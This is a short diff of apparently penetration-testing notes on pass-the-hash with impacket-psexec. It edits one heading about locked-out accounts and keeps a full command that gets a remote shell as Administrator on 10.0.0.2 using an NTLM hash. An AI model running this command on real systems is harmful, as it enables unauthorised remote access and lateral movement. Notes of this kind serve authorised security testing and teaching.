@@ -1,4 +1,4 @@
-# IMPACKET-PSEXEC WORKS EVEN WITH LOCKEOUT ACCOUNTS:
+# IMPACKET-PSEXEC MAYBE WORKS WITH LOCKEOUT ACCOUNTS?
 # Using PSExec will need 32 zeros and then the NTLM hash. It will write a file on the target, create a service and start it, retrieving a CLI. At exit it have a cleanup of these steps:
 impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f002..5abed1762964b  Administrator@10.0.0.2
 
